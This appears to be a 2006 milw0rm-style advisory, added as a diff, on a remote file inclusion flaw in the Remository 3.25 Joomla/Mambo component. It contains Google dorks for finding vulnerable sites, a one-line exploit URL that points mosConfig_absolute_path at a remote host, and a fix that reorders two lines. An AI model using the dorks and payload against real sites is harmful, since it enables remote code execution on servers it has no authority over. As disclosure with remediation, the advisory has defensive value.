@@ -1,0 +1,91 @@
+    .:[ insecurity research team ]:.
+     .__..____.:.______.____.:.____ .
+ .:. |  |/    \:/  ___// __ \:/   _\.:.
+   : |  |   |  \\____\\  ___/\   /__ :. .
+ ..: |__|___|  /____  >\___  >\___  >.:
+   .:.. ..  .\/   .:\/:.  .\/.  .:\/:
+ .   ...:.    .advisory.    .:...
+         :..................: o9.o8.2oo6 ..
+ 
+ 
+  Affected Application: Remository v3.25 
+
+       (Mambo/Joomla CMS Component)
+ 
+ 
+ . . :[ contact ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  Discoverd by: camino
+ 
+  Team: Insecurity Research Team
+ 
+  URL: http://www.insecurityresearch.org
+ 
+  E-Mail: camino@sexmagnet.com
+ 
+ 
+ 
+ . . :[ insecure application details ]: . . . . . . . . . . . . . . . . .
+ 
+ 
+  Typ: Remote [x]  Local [ ]
+ 
+       Remote File Inclusion [x]  SQL Injection [ ]
+ 
+  Level: Low [ ]  Middle [x]  High [ ]
+ 
+  Application: Remository
+ 
+  Version: 3.25
+ 
+  Vulnerable File: admin.remository.php
+ 
+  URL: http://www.remository.com
+ 
+  Description: It's a component that works with Mambo CMS 4.5+ to 
+
+               provide a selection of files that users can download. 
+ 
+  Dork: intext:"Remository 3.25. is technology by Black Sheep Research"
+
+        inurl:"com_remository"
+ 
+ 
+ 
+ . . :[ exploit ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  http://[sitepath]/[joomlapath]/administrator/components/
+
+  com_remository/admin.remository.php?mosConfig_absolute_path=http://huh?
+ 
+ 
+ 
+ . . :[ how to fix ]: . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  o1.) open admin.remository.php
+ 
+  o2.) take a look at line 16:
+
+       require_once ($mosConfig_absolute_path.'/components/
+
+       com_remository/com_remository_constants.php');
+ 
+  o3.) take a look at line 19:
+
+       defined( '_VALID_MOS' ) or die( 'Direct Access to this location 
+ 
+       is not allowed.' );
+ 
+  o4.) exchange line 19 with line 16!
+ 
+ 
+ 
+ . . :[ greets ]: . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  all the sexy members of insecurity research team ;-)
+
+# milw0rm.com [2006-08-10]
